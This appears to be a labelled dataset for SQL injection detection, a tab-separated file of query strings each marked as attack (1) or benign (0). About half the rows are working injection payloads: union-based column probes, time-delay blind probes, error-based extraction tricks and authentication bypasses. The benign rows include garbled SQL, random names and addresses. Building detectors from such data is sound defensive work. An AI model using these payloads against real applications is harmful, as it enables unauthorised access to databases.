Payload	Attacker
SELECT writer FROM party UNION ALL SELECT truth FROM upon ORDER BY train	0
SELECT * FROM railroad WHERE stepped  BETWEEN 10 AND 20	0
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM children WHERE pool NOT LIKE '[perhaps]%'	0
"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'odkr'  =  'odkr	1
1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
select sleep  (  5  )  -- hlgt	1
quinn	0
   SELECT promised, additional, learn FROM value WHERE order  IS NULL	0
das	0
end and 'huti' like 'huti	1
SELECT folks ( s )  FROM loss SELECT might ( s ) 	0
 SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID WHERE LastName  =  'Davolio' OR LastName  =  'Fuller' GROUP BY LastName HAVING  COUNT ( Orders.OrderID )  > 25;	0
"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--"	1
   SELECT Employees.fun, COUNT ( Orders.ruleID )  AS anyoneFROM    ( OrdersINNER JOIN pot ON Orders.coolID  =  Employees.beautyID ) 	0
1'  )   rlike   (  select   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ) 	1
-6436' in boolean mode  )   union all select 7589,7589,7589,7589--	1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 	1
sanchez 49,	0
SELECT AVG ( writing )  FROM bad  SELECT SUM ( shout ) 	0
   SELECT couple, moment, veryFROM bean WHERE outside  IS NOT NULL	0
9.49221E+015	0
SELECT AVG ( both )  FROM bring  SELECT SUM ( herd ) 	0
SELECT * FROM occasionally 3	0
SELECT * FROM me WHERE affect = 'percent'	0
557ni03r5o	0
5h5c8	0
1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  	1
SELECT COUNT ( represent )  FROM purple	0
2720340000000000	0
   SELECT baseball, look, groundFROM busy WHERE change  IS NOT NULL	0
SELECT TOP 50 PERCENT * FROM sense	0
  SELECT rule,cave FROM agree WHERE naturally = 'package' UNION SELECT specific, remain FROM paragraph	0
SELECT saved FROM coffee UNION ALL SELECT energy FROM closely ORDER BY consist	0
"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--"	1
zoq3et1r8	0
ornella	0
17463	0
zahira	0
1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
SELECT AVG ( meat ) FROM ants	0
polanco	0
   SELECT COUNT ( fought ) , sweet FROM factor BY stage	0
1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
amorebieta-etxano	0
SELECT * FROM soon WHERE frozen NOT BETWEEN 'remember' AND 'has'	0
 SELECT * FROM once ORDER BY bee ASC, allow DESC	0
-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#	1
1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
lap-pun2@streaptease.hk	0
   SELECT salt, lunch, atmosphereFROM bag WHERE yourself  IS NOT NULL	0
SELECT * FROM lunch WHERE discovery = 'uncle'	0
arlota	0
bret3	0
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1"	1
fregaci5n	0
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--"	1
"admin"" #"	1
1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#	1
1'   )    )    as hqhs where 5383  =  5383	1
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm	1
SELECT hand	0
SELECT * FROM anybody WHERE dear = 'dirt' FETCH FIRST 3 ROWS ONLY	0
-2891 where 1770  =  1770 or 9290  =  5866	1
-8124  )   union all select 7251,7251,7251#	1
schouwen	0
brgmann saura	0
select   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  select 9455 from mysql.db  )   end  )  #	1
-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#	1
pl. lugo 187,	0
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '	1
  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   	1
SELECT AVG ( Price ) FROM man	0
SELECT * FROM card WHERE eat NOT BETWEEN 'happily' AND 'check'	0
1%' union all select null#	1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079	1
1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#	1
SELECT * FROM  ( SELECT worth FROM foreign ) 	0
SELECT * FROM  ( SELECT weak FROM breakfast ) 	0
41420	0
SELECT TOP 3 * FROM pet	0
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng	1
SELECT species ( s )  FROM lamp SELECT numeral ( s ) 	0
SELECT * FROM represent WHERE exactly NOT LIKE 'toy%'	0
"1""   )    )    as bbkl where 5686  =  5686"	1
  SELECT respectID AS ID, experiment AS happily FROM can	0
"SELECT CAST ( ""14:06:10"" AS TIME ) ;"	0
16601924h	0
c/ otumba, 132,	0
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'odsl' like 'odsl	1
select case when 8237  =  9948 then 1 else null end--	1
SELECT option_value FROM wp_options WHERE option_name  =  'options_cell_number' LIMIT 1	0
  SELECT planetID AS ID, grew AS knew FROM ranch	0
1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
mcguinness.clayburgh7@eldeseodepecar.gu	0
SELECT try FROM ball UNION ALL SELECT anyway FROM stock ORDER BY yourself	0
-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr	1
  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe	0
SELECT AVG ( wish ) FROM pile SELECT SUM ( duty ) 	0
SELECT * FROM  ( SELECT far FROM handle ) 	0
SELECT MIN ( while )  AS excited FROM whole	0
87053274e	0
  UPDATE directly SET kept =  'sold', City =  'out' WHERE fell =  baby	0
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31'	0
-2912'   )    )    order by 1--	1
SELECT AVG ( principal ) FROM cow	0
cufre sans	0
SELECT * FROM correct WHERE mainly = 'gone' LIMIT 3	0
  SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forgetID ORDER BY Orders.circusID	0
  SELECT Orders.streamrID, Employees.run, Employees.wear FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.catID ORDER BY Orders.unusualID	0
maximiliano	0
  SELECT * FROM mean WHERE zipper IN  ( 'herd', 'prove', 'valley' )  	0
 select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1	1
naguib	0
SELECT * FROM  ( SELECT paid FROM cook ) 	0
-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
gatada	0
malleson_varney@tomorrow.com.cz	0
  SELECT * FROM getting WHERE nine IN  ( 'string', 'bone', 'judge' )  	0
  SELECT * FROM suppose WHERE threw IN  ( 'student', 'rope', 'means' )  	0
SELECT object FROM important	0
  SELECT primitive,term FROM government WHERE making = 'except' UNION SELECT such, roof FROM consonant	0
 SELECT * FROM unusual ORDER BY section, deep	0
SELECT * FROM birthday 3 SELECT * FROM impossible	0
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
1  )   as sglv where 7676  =  7676	1
SELECT * FROM recently 3 SELECT * FROM excellent	0
"1%"" union all select null,null,null,null,null#"	1
1  )   union all select null#	1
" SELECT OrderID, Quantity, IF ( Quantity>10, ""MORE"", ""LESS"" )  FROM  OrderDetails;"	0
   SELECT fought, previous, occasionally FROM without WHERE meant  IS NULL	0
SELECT * FROM nature 3	0
okura4	0
1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji	1
37759460s	0
SELECT AVG ( touch ) FROM then	0
SELECT TOP 50 PERCENT * FROM fallen	0
1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '	1
SELECT meet ( s FROM avoid RIGHT JOIN	0
SELECT adjective ( s )  FROM short FULL OUTER JOIN	0
SELECT * FROM income WHERE chapter = 'distant'  AND City = 'pleasant'	0
if  (  8727  =  4039  )   select 8727 else drop function giql--	1
iif  (  1746  =  1730,1,1/0  )  	1
1' where 8437  =  8437 and make_set  (  8403  =  8403,8899  )  --	1
  SELECT vapor AS flew, dog AS [cent]  FROM her	0
villarrasa	0
caabate liano	0
argeo	0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk	0
&1c	1
SELECT * FROM wore  WHERE beyond NOT LIKE '[beneath]%'	0
"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv"	1
"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#"	1
SELECT * FROM distance  WHERE former NOT LIKE '[attempt]%'	0
SELECT AVG ( package ) FROM queen SELECT SUM ( ran ) 	0
vaillant altimir	0
7400290000000000	0
SELECT surprise FROM purpose	0
   SELECT you,dance,welcome,leg,children     (  (  ball JOIN ahead ON account.birth =  driving.visit )   INNER JOIN disappearON Orders.sick =  eight.purposeID ) 	0
SELECT * FROM end 3	0
port fangos, 183,	0
INSERT INTO prize ( low, opinion, action, division, though, taken )  VALUES  ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )  	0
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""svse""  =  ""svse"	1
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--"	1
empentar	0
c/ fernandez shaw, 177 1-e	0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka	1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'omlt'  =  'omlt	1
INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  	0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3	1
SELECT * FROM wp_posts WHERE ID  =  28635 LIMIT 1	0
lealtad, 78, 6-h	0
SELECT *FROM  ( SELECT column_name ( s )  FROM	0
ivey	0
calle sant pau, 117,	0
\x27UNION SELECT	1
SELECT alive ( s )  FROM usually SELECT exactly FROM arm	0
-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--	1
"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#"	1
  UPDATE fun SET park =  'any', City =  'birth' WHERE twice =  sudden	0
1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  	1
SELECT * FROM story WHERE table BETWEEN '1996-07-01' AND '1996-07-31'	0
%2A%7C	1
SELECT * FROM  ( SELECT ancient FROM determine ) 	0
-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob	1
SELECT * FROM triangle WHERE Price NOT BETWEEN 10 AND 20	0
SELECT TOP 3 * FROM map WHERE island = 'mission' SELECT * FROM cutting	0
valentik	0
re681g48rdia	0
1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh	1
"1""  )   where 9285  =  9285 and 8506  =  8343#"	1
SELECT AVG ( Price ) FROM red	0
16370	0
SELECT * FROM discover WHERE stems = 'church'  OR pilot = 'coach'	0
88356550a	0
-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#	1
"1""  )   where 2602  =  2602 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
 SELECT column_name ( s )  FROM chapter,west	0
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
SELECT * FROM putting FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM human	0
1'  )   as zdhq where 5586  =  5586	1
1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
8847	0
1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
"1""   )    )    as fmul where 7827  =  7827"	1
calle pintor picasso, 182 5?d	0
SELECT AVG ( Price ) FROM recognize	0
SELECT * FROM without WHERE car = 'especially'  OR tears = 'southern'	0
almagrar	0
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century'	0
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  	1
SELECT MIN ( thrown )  AS poor FROM evening	0
SELECT * FROM tongue 3	0
1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '	1
-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--	1
1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
  SELECT spread AS plant, tears AS [mile]  FROM month	0
